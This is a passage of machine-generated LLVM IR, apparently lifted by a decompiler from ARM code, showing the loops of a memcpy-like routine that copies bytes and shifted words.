  %v3_2d480 = load i8*, i8** %stack_var_-8, align 4
  %v4_2d480 = ptrtoint i8* %v3_2d480 to i32
  store i32 %v4_2d480, i32* %r0.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %bb141.bb143_crit_edge, %bb142
  %v0_2d484 = phi i32 [ %v0_2d484.pre, %bb141.bb143_crit_edge ], [ %v8_2d3ec, %bb142 ]
  call void @__pseudo_cond_branch(i1 %v7_2d47c, i32 %v0_2d484)
  %v0_2d488 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d488 = add i32 %v0_2d488, -2
  %v3_2d488 = sub i32 1, %v0_2d488
  %v4_2d488 = and i32 %v3_2d488, %v0_2d488
  %v5_2d488 = icmp slt i32 %v4_2d488, 0
  store i1 %v5_2d488, i1* %cpsr_v.global-to-local, align 1
  %v6_2d488 = icmp slt i32 %v1_2d488, 0
  store i1 %v6_2d488, i1* %cpsr_n.global-to-local, align 1
  %v7_2d488 = icmp eq i32 %v0_2d488, 2
  store i1 %v7_2d488, i1* %cpsr_z.global-to-local, align 1
  %v0_2d48c = load i32, i32* %r1.global-to-local, align 4
  %v1_2d48c = inttoptr i32 %v0_2d48c to i8*
  %v2_2d48c = load i8, i8* %v1_2d48c, align 1
  %v5_2d48c = add i32 %v0_2d48c, 1
  store i32 %v5_2d48c, i32* %r1.global-to-local, align 4
  %v2_2d490 = load i32, i32* %r0.global-to-local, align 4
  %v3_2d490 = inttoptr i32 %v2_2d490 to i8*
  store i8 %v2_2d48c, i8* %v3_2d490, align 1
  %v4_2d490 = load i32, i32* %r0.global-to-local, align 4
  %v5_2d490 = add i32 %v4_2d490, 1
  store i32 %v5_2d490, i32* %r0.global-to-local, align 4
  %v0_2d494 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_2d494 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_2d494 = xor i1 %v0_2d494, %v1_2d494
  br i1 %v2_2d494, label %.thread125, label %bb144

bb144:                                            ; preds = %bb143
  %v3_2d494 = load i32, i32* %r1.global-to-local, align 4
  %v4_2d494 = inttoptr i32 %v3_2d494 to i8*
  %v5_2d494 = load i8, i8* %v4_2d494, align 1
  %v8_2d494 = add i32 %v3_2d494, 1
  store i32 %v8_2d494, i32* %r1.global-to-local, align 4
  %v6_2d498 = inttoptr i32 %v5_2d490 to i8*
  store i8 %v5_2d494, i8* %v6_2d498, align 1
  %v7_2d498 = load i32, i32* %r0.global-to-local, align 4
  %v8_2d498 = add i32 %v7_2d498, 1
  store i32 %v8_2d498, i32* %r0.global-to-local, align 4
  %v1_2d49c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_2d49c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb143, %bb144
  %v7_2d4a0 = phi i32 [ %v8_2d498, %bb144 ], [ %v5_2d490, %bb143 ]
  %v2_2d4a0 = phi i1 [ %v2_2d49c.pre, %bb144 ], [ %v1_2d494, %bb143 ]
  %v1_2d4a0 = phi i1 [ %v1_2d49c.pre, %bb144 ], [ %v0_2d494, %bb143 ]
  %v0_2d49c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_2d49c = xor i1 %v2_2d4a0, %v1_2d4a0
  %v4_2d49c = or i1 %v0_2d49c, %v3_2d49c
  br i1 %v4_2d49c, label %.thread126, label %bb145

bb145:                                            ; preds = %.thread125
  %v5_2d49c = load i32, i32* %r1.global-to-local, align 4
  %v6_2d49c = inttoptr i32 %v5_2d49c to i8*
  %v7_2d49c = load i8, i8* %v6_2d49c, align 1
  %v10_2d49c = add i32 %v5_2d49c, 1
  store i32 %v10_2d49c, i32* %r1.global-to-local, align 4
  %v8_2d4a0 = inttoptr i32 %v7_2d4a0 to i8*
  store i8 %v7_2d49c, i8* %v8_2d4a0, align 1
  %v9_2d4a0 = load i32, i32* %r0.global-to-local, align 4
  %v10_2d4a0 = add i32 %v9_2d4a0, 1
  store i32 %v10_2d4a0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb145
  %v2_2d4a4 = load i8*, i8** %stack_var_-8, align 4
  %v3_2d4a4 = ptrtoint i8* %v2_2d4a4 to i32
  store i32 %v3_2d4a4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_2d3ec)
  %v0_2d4ac.pre = load i32, i32* @ip, align 4
  %v0_2d4b4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_2d4b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2d4ac

dec_label_pc_2d4ac:                               ; preds = %dec_label_pc_2d3f8, %.thread126
  %v2_2d4b8 = phi i32 [ %v1_2d3e0, %dec_label_pc_2d3f8 ], [ %v2_2d4b8.pre, %.thread126 ]
  %v0_2d4b4 = phi i32 [ %v0_2d3e0, %dec_label_pc_2d3f8 ], [ %v0_2d4b4.pre, %.thread126 ]
  %v0_2d4ac = phi i32 [ %v1_2d3f8, %dec_label_pc_2d3f8 ], [ %v0_2d4ac.pre, %.thread126 ]
  %v1_2d4ac = sub i32 4, %v0_2d4ac
  store i32 %v1_2d4ac, i32* @ip, align 4
  %v1_2d4b0 = add i32 %v1_2d4ac, -2
  %v3_2d4b0 = sub i32 1, %v1_2d4ac
  %v4_2d4b0 = and i32 %v3_2d4b0, %v1_2d4ac
  %v5_2d4b0 = icmp slt i32 %v4_2d4b0, 0
  store i1 %v5_2d4b0, i1* %cpsr_v.global-to-local, align 1
  %v6_2d4b0 = icmp slt i32 %v1_2d4b0, 0
  store i1 %v6_2d4b0, i1* %cpsr_n.global-to-local, align 1
  %v7_2d4b0 = icmp eq i32 %v1_2d4ac, 2
  store i1 %v7_2d4b0, i1* %cpsr_z.global-to-local, align 1
  %v1_2d4b4 = inttoptr i32 %v0_2d4b4 to i8*
  %v2_2d4b4 = load i8, i8* %v1_2d4b4, align 1
  %v3_2d4b4 = zext i8 %v2_2d4b4 to i32
  store i32 %v3_2d4b4, i32* @r3, align 4
  %v5_2d4b4 = add i32 %v0_2d4b4, 1
  store i32 %v5_2d4b4, i32* %r1.global-to-local, align 4
  %v3_2d4b8 = inttoptr i32 %v2_2d4b8 to i8*
  store i8 %v2_2d4b4, i8* %v3_2d4b8, align 1
  %v4_2d4b8 = load i32, i32* %r0.global-to-local, align 4
  %v5_2d4b8 = add i32 %v4_2d4b8, 1
  store i32 %v5_2d4b8, i32* %r0.global-to-local, align 4
  %v0_2d4bc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_2d4bc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_2d4bc = xor i1 %v0_2d4bc, %v1_2d4bc
  br i1 %v2_2d4bc, label %.thread127, label %bb146

bb146:                                            ; preds = %dec_label_pc_2d4ac
  %v3_2d4bc = load i32, i32* %r1.global-to-local, align 4
  %v4_2d4bc = inttoptr i32 %v3_2d4bc to i8*
  %v5_2d4bc = load i8, i8* %v4_2d4bc, align 1
  %v6_2d4bc = zext i8 %v5_2d4bc to i32
  store i32 %v6_2d4bc, i32* @r3, align 4
  %v8_2d4bc = add i32 %v3_2d4bc, 1
  store i32 %v8_2d4bc, i32* %r1.global-to-local, align 4
  %v6_2d4c0 = inttoptr i32 %v5_2d4b8 to i8*
  store i8 %v5_2d4bc, i8* %v6_2d4c0, align 1
  %v7_2d4c0 = load i32, i32* %r0.global-to-local, align 4
  %v8_2d4c0 = add i32 %v7_2d4c0, 1
  store i32 %v8_2d4c0, i32* %r0.global-to-local, align 4
  %v1_2d4c4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_2d4c4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_2d4ac, %bb146
  %v7_2d4c8 = phi i32 [ %v8_2d4c0, %bb146 ], [ %v5_2d4b8, %dec_label_pc_2d4ac ]
  %v2_2d4c8 = phi i1 [ %v2_2d4c4.pre, %bb146 ], [ %v1_2d4bc, %dec_label_pc_2d4ac ]
  %v1_2d4c8 = phi i1 [ %v1_2d4c4.pre, %bb146 ], [ %v0_2d4bc, %dec_label_pc_2d4ac ]
  %v0_2d4c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_2d4c4 = xor i1 %v2_2d4c8, %v1_2d4c8
  %v4_2d4c4 = or i1 %v0_2d4c4, %v3_2d4c4
  br i1 %v4_2d4c4, label %.thread128, label %bb147

bb147:                                            ; preds = %.thread127
  %v5_2d4c4 = load i32, i32* %r1.global-to-local, align 4
  %v6_2d4c4 = inttoptr i32 %v5_2d4c4 to i8*
  %v7_2d4c4 = load i8, i8* %v6_2d4c4, align 1
  %v8_2d4c4 = zext i8 %v7_2d4c4 to i32
  store i32 %v8_2d4c4, i32* @r3, align 4
  %v10_2d4c4 = add i32 %v5_2d4c4, 1
  store i32 %v10_2d4c4, i32* %r1.global-to-local, align 4
  %v8_2d4c8 = inttoptr i32 %v7_2d4c8 to i8*
  store i8 %v7_2d4c4, i8* %v8_2d4c8, align 1
  %v9_2d4c8 = load i32, i32* %r0.global-to-local, align 4
  %v10_2d4c8 = add i32 %v9_2d4c8, 1
  store i32 %v10_2d4c8, i32* %r0.global-to-local, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb147
  %v0_2d5fc77 = phi i32 [ %v10_2d4c8, %bb147 ], [ %v7_2d4c8, %.thread127 ]
  %v0_2d4cc = load i32, i32* %r2.global-to-local, align 4
  %v1_2d4cc = load i32, i32* @ip, align 4
  %v2_2d4cc = sub i32 %v0_2d4cc, %v1_2d4cc
  store i32 %v2_2d4cc, i32* %r2.global-to-local, align 4
  %v4_2d4cc = xor i32 %v1_2d4cc, %v0_2d4cc
  %v5_2d4cc = xor i32 %v2_2d4cc, %v0_2d4cc
  %v6_2d4cc = and i32 %v5_2d4cc, %v4_2d4cc
  %v7_2d4cc = icmp slt i32 %v6_2d4cc, 0
  store i1 %v7_2d4cc, i1* %cpsr_v.global-to-local, align 1
  %v8_2d4cc = icmp slt i32 %v2_2d4cc, 0
  store i1 %v8_2d4cc, i1* %cpsr_n.global-to-local, align 1
  %v9_2d4cc = icmp eq i32 %v0_2d4cc, %v1_2d4cc
  store i1 %v9_2d4cc, i1* %cpsr_z.global-to-local, align 1
  %v2_2d4d0 = xor i1 %v8_2d4cc, %v7_2d4cc
  br i1 %v2_2d4d0, label %bb141, label %dec_label_pc_2d4d4

dec_label_pc_2d4d4:                               ; preds = %.thread128
  %v0_2d4d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d4d4 = urem i32 %v0_2d4d4, 4
  store i32 %v1_2d4d4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2d4d4 = icmp eq i32 %v1_2d4d4, 0
  store i1 %v2_2d4d4, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_2d4d4 to i2
  br i1 %v2_2d4d4, label %dec_label_pc_2d408, label %dec_label_pc_2d4dc

dec_label_pc_2d4dc:                               ; preds = %dec_label_pc_2d400, %dec_label_pc_2d4d4
  %v0_2d5fc76 = phi i32 [ %v1_2d3e0, %dec_label_pc_2d400 ], [ %v0_2d5fc77, %dec_label_pc_2d4d4 ]
  %v0_2d564 = phi i32 [ %v2_2d3f0, %dec_label_pc_2d400 ], [ %v2_2d4cc, %dec_label_pc_2d4d4 ]
  %v0_2d4e4.off0 = phi i2 [ %extract.t, %dec_label_pc_2d400 ], [ %extract.t131, %dec_label_pc_2d4d4 ]
  %v0_2d4dc = phi i32 [ %v0_2d3e0, %dec_label_pc_2d400 ], [ %v0_2d4d4, %dec_label_pc_2d4d4 ]
  %v1_2d4dc = and i32 %v0_2d4dc, -4
  store i32 %v1_2d4dc, i32* %r1.global-to-local, align 4
  %v1_2d4e0 = inttoptr i32 %v1_2d4dc to i32*
  %v2_2d4e0 = load i32, i32* %v1_2d4e0, align 4
  store i32 %v2_2d4e0, i32* %lr.global-to-local, align 4
  %v4_2d4e0 = add i32 %v1_2d4dc, 4
  store i32 %v4_2d4e0, i32* %r1.global-to-local, align 4
  %v1_2d55c = add i32 %v0_2d564, -12
  %v3_2d55c = sub i32 11, %v0_2d564
  %v4_2d55c = and i32 %v3_2d55c, %v0_2d564
  %v5_2d55c = icmp slt i32 %v4_2d55c, 0
  store i1 %v5_2d55c, i1* %cpsr_v.global-to-local, align 1
  %v6_2d55c = icmp slt i32 %v1_2d55c, 0
  store i1 %v6_2d55c, i1* %cpsr_n.global-to-local, align 1
  %v7_2d55c = icmp eq i32 %v0_2d564, 12
  store i1 %v7_2d55c, i1* %cpsr_z.global-to-local, align 1
  %v2_2d560 = xor i1 %v6_2d55c, %v5_2d55c
  switch i2 %v0_2d4e4.off0, label %dec_label_pc_2d4f0 [
    i2 -1, label %dec_label_pc_2d5c8
    i2 -2, label %dec_label_pc_2d55c
  ]

dec_label_pc_2d4f0:                               ; preds = %dec_label_pc_2d4dc
  br i1 %v2_2d560, label %dec_label_pc_2d53c, label %dec_label_pc_2d4f8

dec_label_pc_2d4f8:                               ; preds = %dec_label_pc_2d4f0
  store i32 %v1_2d55c, i32* %r2.global-to-local, align 4
  %v3_2d4fc = load i32, i32* @r4, align 4
  store i32 %v3_2d4fc, i32* %stack_var_-16, align 4
  %v6_2d4fc = load i32, i32* @r5, align 4
  store i32 %v6_2d4fc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2d500

dec_label_pc_2d500:                               ; preds = %dec_label_pc_2d500.dec_label_pc_2d500_crit_edge, %dec_label_pc_2d4f8
  %v0_2d524 = phi i32 [ %v12_2d524, %dec_label_pc_2d500.dec_label_pc_2d500_crit_edge ], [ %v0_2d5fc76, %dec_label_pc_2d4f8 ]
  %v0_2d504 = phi i32 [ %v0_2d504.pre, %dec_label_pc_2d500.dec_label_pc_2d500_crit_edge ], [ %v4_2d4e0, %dec_label_pc_2d4f8 ]
  %v0_2d500 = phi i32 [ %v0_2d500.pre, %dec_label_pc_2d500.dec_label_pc_2d500_crit_edge ], [ %v2_2d4e0, %dec_label_pc_2d4f8 ]
  %v3_2d500 = udiv i32 %v0_2d500, 256
  %v1_2d504 = inttoptr i32 %v0_2d504 to i32*
  %v2_2d504 = load i32, i32* %v1_2d504, align 4
  store i32 %v2_2d504, i32* %r4.global-to-local, align 4
  %v3_2d504 = add i32 %v0_2d504, 4
  %v4_2d504 = inttoptr i32 %v3_2d504 to i32*
  %v5_2d504 = load i32, i32* %v4_2d504, align 4
  store i32 %v5_2d504, i32* %r5.global-to-local, align 4
  %v6_2d504 = add i32 %v0_2d504, 8
  %v7_2d504 = inttoptr i32 %v6_2d504 to i32*
  %v8_2d504 = load i32, i32* %v7_2d504, align 4
  store i32 %v8_2d504, i32* %ip.global-to-local, align 4
  %v9_2d504 = add i32 %v0_2d504, 12
  %v10_2d504 = inttoptr i32 %v9_2d504 to i32*
  %v11_2d504 = load i32, i32* %v10_2d504, align 4
  store i32 %v11_2d504, i32* %lr.global-to-local, align 4
  %v12_2d504 = add i32 %v0_2d504, 16
  store i32 %v12_2d504, i32* %r1.global-to-local, align 4
  %v4_2d508 = mul i32 %v2_2d504, 16777216
  %v5_2d508 = or i32 %v4_2d508, %v3_2d500
  store i32 %v5_2d508, i32* @r3, align 4
  %v3_2d50c = udiv i32 %v2_2d504, 256
  %v4_2d510 = mul i32 %v5_2d504, 16777216
  %v5_2d510 = or i32 %v4_2d510, %v3_2d50c
  store i32 %v5_2d510, i32* %r4.global-to-local, align 4
  %v3_2d514 = udiv i32 %v5_2d504, 256
  %v4_2d518 = mul i32 %v8_2d504, 16777216
  %v5_2d518 = or i32 %v4_2d518, %v3_2d514
  store i32 %v5_2d518, i32* %r5.global-to-local, align 4
  %v3_2d51c = udiv i32 %v8_2d504, 256
  %v4_2d520 = mul i32 %v11_2d504, 16777216
  %v5_2d520 = or i32 %v4_2d520, %v3_2d51c
  store i32 %v5_2d520, i32* @ip, align 4
  %v1_2d524 = inttoptr i32 %v0_2d524 to i32*
  store i32 %v5_2d508, i32* %v1_2d524, align 4
  %v3_2d524 = add i32 %v0_2d524, 4
  %v4_2d524 = inttoptr i32 %v3_2d524 to i32*
  %v5_2d524 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2d524, i32* %v4_2d524, align 4
  %v6_2d524 = add i32 %v0_2d524, 8
  %v7_2d524 = inttoptr i32 %v6_2d524 to i32*
  %v8_2d524 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_2d524, i32* %v7_2d524, align 4
  %v9_2d524 = add i32 %v0_2d524, 12
  %v10_2d524 = inttoptr i32 %v9_2d524 to i32*
  %v11_2d524 = load i32, i32* @ip, align 4
  store i32 %v11_2d524, i32* %v10_2d524, align 4
  %v12_2d524 = add i32 %v0_2d524, 16
  store i32 %v12_2d524, i32* %r0.global-to-local, align 4
  %v0_2d528 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d528 = add i32 %v0_2d528, -16
  store i32 %v1_2d528, i32* %r2.global-to-local, align 4
  %v3_2d528 = sub i32 15, %v0_2d528
  %v4_2d528 = and i32 %v3_2d528, %v0_2d528
  %v5_2d528 = icmp slt i32 %v4_2d528, 0
  %v6_2d528 = icmp slt i32 %v1_2d528, 0
  %v2_2d52c = xor i1 %v6_2d528, %v5_2d528
  br i1 %v2_2d52c, label %dec_label_pc_2d530, label %dec_label_pc_2d500.dec_label_pc_2d500_crit_edge

dec_label_pc_2d500.dec_label_pc_2d500_crit_edge:  ; preds = %dec_label_pc_2d500
  %v0_2d500.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_2d504.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2d500

dec_label_pc_2d530:                               ; preds = %dec_label_pc_2d500
  %v2_2d530 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2d530, i32* @r4, align 4
  %v5_2d530 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_2d530, i32* @r5, align 4
  %v1_2d534 = add i32 %v0_2d528, -4
  store i32 %v1_2d534, i32* %r2.global-to-local, align 4
  %v3_2d534 = add i32 %v0_2d528, 2147483632
  %v4_2d534 = and i32 %v1_2d534, %v3_2d534
  %v5_2d534 = icmp slt i32 %v4_2d534, 0
  store i1 %v5_2d534, i1* %cpsr_v.global-to-local, align 1
  %v6_2d534 = icmp slt i32 %v1_2d534, 0
  store i1 %v6_2d534, i1* %cpsr_n.global-to-local, align 1
  %v7_2d534 = icmp eq i32 %v1_2d534, 0
  store i1 %v7_2d534, i1* %cpsr_z.global-to-local, align 1
  %v2_2d538 = xor i1 %v6_2d534, %v5_2d534
  br i1 %v2_2d538, label %dec_label_pc_2d554, label %dec_label_pc_2d53c

dec_label_pc_2d53c:                               ; preds = %dec_label_pc_2d530, %dec_label_pc_2d4f0, %dec_label_pc_2d53c
  %v1_2d548 = phi i32 [ %v4_2d548, %dec_label_pc_2d53c ], [ %v12_2d524, %dec_label_pc_2d530 ], [ %v0_2d5fc76, %dec_label_pc_2d4f0 ]
  %v0_2d53c = load i32, i32* %lr.global-to-local, align 4
  %v3_2d53c = udiv i32 %v0_2d53c, 256
  store i32 %v3_2d53c, i32* %ip.global-to-local, align 4
  %v0_2d540 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d540 = inttoptr i32 %v0_2d540 to i32*
  %v2_2d540 = load i32, i32* %v1_2d540, align 4
  store i32 %v2_2d540, i32* %lr.global-to-local, align 4
  %v4_2d540 = add i32 %v0_2d540, 4
  store i32 %v4_2d540, i32* %r1.global-to-local, align 4
  %v4_2d544 = mul i32 %v2_2d540, 16777216
  %v5_2d544 = or i32 %v4_2d544, %v3_2d53c
  store i32 %v5_2d544, i32* @ip, align 4
  %v2_2d548 = inttoptr i32 %v1_2d548 to i32*
  store i32 %v5_2d544, i32* %v2_2d548, align 4
  %v3_2d548 = load i32, i32* %r0.global-to-local, align 4
  %v4_2d548 = add i32 %v3_2d548, 4
  store i32 %v4_2d548, i32* %r0.global-to-local, align 4
  %v0_2d54c = load i32, i32* %r2.global-to-local, align 4
  %v1_2d54c = add i32 %v0_2d54c, -4
  store i32 %v1_2d54c, i32* %r2.global-to-local, align 4
  %v3_2d54c = sub i32 3, %v0_2d54c
  %v4_2d54c = and i32 %v3_2d54c, %v0_2d54c
  %v5_2d54c = icmp slt i32 %v4_2d54c, 0
  %v6_2d54c = icmp slt i32 %v1_2d54c, 0
  %v2_2d550 = xor i1 %v6_2d54c, %v5_2d54c
  br i1 %v2_2d550, label %dec_label_pc_2d554.loopexit, label %dec_label_pc_2d53c

dec_label_pc_2d554.loopexit:                      ; preds = %dec_label_pc_2d53c
  %v7_2d54c = icmp eq i32 %v0_2d54c, 4
  store i1 %v5_2d54c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_2d54c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_2d54c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2d554

dec_label_pc_2d554:                               ; preds = %dec_label_pc_2d554.loopexit, %dec_label_pc_2d530
  %v0_2d47c59 = phi i32 [ %v1_2d54c, %dec_label_pc_2d554.loopexit ], [ %v1_2d534, %dec_label_pc_2d530 ]
  %v0_2d554 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d554 = add i32 %v0_2d554, -3
  store i32 %v1_2d554, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_2d55c:                               ; preds = %dec_label_pc_2d4dc
  br i1 %v2_2d560, label %dec_label_pc_2d5a8, label %dec_label_pc_2d564

dec_label_pc_2d564:                               ; preds = %dec_label_pc_2d55c
  store i32 %v1_2d55c, i32* %r2.global-to-local, align 4
  %v3_2d568 = load i32, i32* @r4, align 4
  store i32 %v3_2d568, i32* %stack_var_-16, align 4
  %v6_2d568 = load i32, i32* @r5, align 4
  store i32 %v6_2d568, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2d56c

dec_label_pc_2d56c:                               ; preds = %dec_label_pc_2d56c.dec_label_pc_2d56c_crit_edge, %dec_label_pc_2d564
  %v0_2d590 = phi i32 [ %v12_2d590, %dec_label_pc_2d56c.dec_label_pc_2d56c_crit_edge ], [ %v0_2d5fc76, %dec_label_pc_2d564 ]
  %v0_2d570 = phi i32 [ %v0_2d570.pre, %dec_label_pc_2d56c.dec_label_pc_2d56c_crit_edge ], [ %v4_2d4e0, %dec_label_pc_2d564 ]
  %v0_2d56c = phi i32 [ %v0_2d56c.pre, %dec_label_pc_2d56c.dec_label_pc_2d56c_crit_edge ], [ %v2_2d4e0, %dec_label_pc_2d564 ]
  %v3_2d56c = udiv i32 %v0_2d56c, 65536
  %v1_2d570 = inttoptr i32 %v0_2d570 to i32*
  %v2_2d570 = load i32, i32* %v1_2d570, align 4
  store i32 %v2_2d570, i32* %r4.global-to-local, align 4
  %v3_2d570 = add i32 %v0_2d570, 4
  %v4_2d570 = inttoptr i32 %v3_2d570 to i32*
  %v5_2d570 = load i32, i32* %v4_2d570, align 4
  store i32 %v5_2d570, i32* %r5.global-to-local, align 4
  %v6_2d570 = add i32 %v0_2d570, 8
  %v7_2d570 = inttoptr i32 %v6_2d570 to i32*
  %v8_2d570 = load i32, i32* %v7_2d570, align 4
  store i32 %v8_2d570, i32* %ip.global-to-local, align 4
  %v9_2d570 = add i32 %v0_2d570, 12
  %v10_2d570 = inttoptr i32 %v9_2d570 to i32*
  %v11_2d570 = load i32, i32* %v10_2d570, align 4
  store i32 %v11_2d570, i32* %lr.global-to-local, align 4
  %v12_2d570 = add i32 %v0_2d570, 16
  store i32 %v12_2d570, i32* %r1.global-to-local, align 4
  %v4_2d574 = mul i32 %v2_2d570, 65536
  %v5_2d574 = or i32 %v4_2d574, %v3_2d56c
  store i32 %v5_2d574, i32* @r3, align 4
  %v3_2d578 = udiv i32 %v2_2d570, 65536
  %v4_2d57c = mul i32 %v5_2d570, 65536
  %v5_2d57c = or i32 %v4_2d57c, %v3_2d578
  store i32 %v5_2d57c, i32* %r4.global-to-local, align 4
  %v3_2d580 = udiv i32 %v5_2d570, 65536
  %v4_2d584 = mul i32 %v8_2d570, 65536
  %v5_2d584 = or i32 %v4_2d584, %v3_2d580
  store i32 %v5_2d584, i32* %r5.global-to-local, align 4
  %v3_2d588 = udiv i32 %v8_2d570, 65536
  %v4_2d58c = mul i32 %v11_2d570, 65536
  %v5_2d58c = or i32 %v4_2d58c, %v3_2d588
  store i32 %v5_2d58c, i32* @ip, align 4
  %v1_2d590 = inttoptr i32 %v0_2d590 to i32*
  store i32 %v5_2d574, i32* %v1_2d590, align 4
  %v3_2d590 = add i32 %v0_2d590, 4
  %v4_2d590 = inttoptr i32 %v3_2d590 to i32*
  %v5_2d590 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2d590, i32* %v4_2d590, align 4
  %v6_2d590 = add i32 %v0_2d590, 8
  %v7_2d590 = inttoptr i32 %v6_2d590 to i32*
  %v8_2d590 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_2d590, i32* %v7_2d590, align 4
  %v9_2d590 = add i32 %v0_2d590, 12
  %v10_2d590 = inttoptr i32 %v9_2d590 to i32*
  %v11_2d590 = load i32, i32* @ip, align 4
  store i32 %v11_2d590, i32* %v10_2d590, align 4
  %v12_2d590 = add i32 %v0_2d590, 16
  store i32 %v12_2d590, i32* %r0.global-to-local, align 4
  %v0_2d594 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d594 = add i32 %v0_2d594, -16
  store i32 %v1_2d594, i32* %r2.global-to-local, align 4
  %v3_2d594 = sub i32 15, %v0_2d594
  %v4_2d594 = and i32 %v3_2d594, %v0_2d594
  %v5_2d594 = icmp slt i32 %v4_2d594, 0
  %v6_2d594 = icmp slt i32 %v1_2d594, 0
  %v2_2d598 = xor i1 %v6_2d594, %v5_2d594
  br i1 %v2_2d598, label %dec_label_pc_2d59c, label %dec_label_pc_2d56c.dec_label_pc_2d56c_crit_edge

dec_label_pc_2d56c.dec_label_pc_2d56c_crit_edge:  ; preds = %dec_label_pc_2d56c
  %v0_2d56c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_2d570.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2d56c

dec_label_pc_2d59c:                               ; preds = %dec_label_pc_2d56c
  %v2_2d59c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2d59c, i32* @r4, align 4
  %v5_2d59c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_2d59c, i32* @r5, align 4
  %v1_2d5a0 = add i32 %v0_2d594, -4
  store i32 %v1_2d5a0, i32* %r2.global-to-local, align 4
  %v3_2d5a0 = add i32 %v0_2d594, 2147483632
  %v4_2d5a0 = and i32 %v1_2d5a0, %v3_2d5a0
  %v5_2d5a0 = icmp slt i32 %v4_2d5a0, 0
  store i1 %v5_2d5a0, i1* %cpsr_v.global-to-local, align 1
  %v6_2d5a0 = icmp slt i32 %v1_2d5a0, 0
  store i1 %v6_2d5a0, i1* %cpsr_n.global-to-local, align 1
  %v7_2d5a0 = icmp eq i32 %v1_2d5a0, 0
  store i1 %v7_2d5a0, i1* %cpsr_z.global-to-local, align 1
  %v2_2d5a4 = xor i1 %v6_2d5a0, %v5_2d5a0
  br i1 %v2_2d5a4, label %dec_label_pc_2d5c0, label %dec_label_pc_2d5a8

dec_label_pc_2d5a8:                               ; preds = %dec_label_pc_2d59c, %dec_label_pc_2d55c, %dec_label_pc_2d5a8
  %v1_2d5b4 = phi i32 [ %v4_2d5b4, %dec_label_pc_2d5a8 ], [ %v12_2d590, %dec_label_pc_2d59c ], [ %v0_2d5fc76, %dec_label_pc_2d55c ]
  %v0_2d5a8 = load i32, i32* %lr.global-to-local, align 4
  %v3_2d5a8 = udiv i32 %v0_2d5a8, 65536
  store i32 %v3_2d5a8, i32* %ip.global-to-local, align 4
  %v0_2d5ac = load i32, i32* %r1.global-to-local, align 4
  %v1_2d5ac = inttoptr i32 %v0_2d5ac to i32*
  %v2_2d5ac = load i32, i32* %v1_2d5ac, align 4
  store i32 %v2_2d5ac, i32* %lr.global-to-local, align 4
  %v4_2d5ac = add i32 %v0_2d5ac, 4
  store i32 %v4_2d5ac, i32* %r1.global-to-local, align 4
  %v4_2d5b0 = mul i32 %v2_2d5ac, 65536
  %v5_2d5b0 = or i32 %v4_2d5b0, %v3_2d5a8
  store i32 %v5_2d5b0, i32* @ip, align 4
  %v2_2d5b4 = inttoptr i32 %v1_2d5b4 to i32*
  store i32 %v5_2d5b0, i32* %v2_2d5b4, align 4
  %v3_2d5b4 = load i32, i32* %r0.global-to-local, align 4
  %v4_2d5b4 = add i32 %v3_2d5b4, 4
  store i32 %v4_2d5b4, i32* %r0.global-to-local, align 4
  %v0_2d5b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d5b8 = add i32 %v0_2d5b8, -4
  store i32 %v1_2d5b8, i32* %r2.global-to-local, align 4
  %v3_2d5b8 = sub i32 3, %v0_2d5b8
  %v4_2d5b8 = and i32 %v3_2d5b8, %v0_2d5b8
  %v5_2d5b8 = icmp slt i32 %v4_2d5b8, 0
  %v6_2d5b8 = icmp slt i32 %v1_2d5b8, 0
  %v2_2d5bc = xor i1 %v6_2d5b8, %v5_2d5b8
  br i1 %v2_2d5bc, label %dec_label_pc_2d5c0.loopexit, label %dec_label_pc_2d5a8

dec_label_pc_2d5c0.loopexit:                      ; preds = %dec_label_pc_2d5a8
  %v7_2d5b8 = icmp eq i32 %v0_2d5b8, 4
  store i1 %v5_2d5b8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_2d5b8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_2d5b8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2d5c0

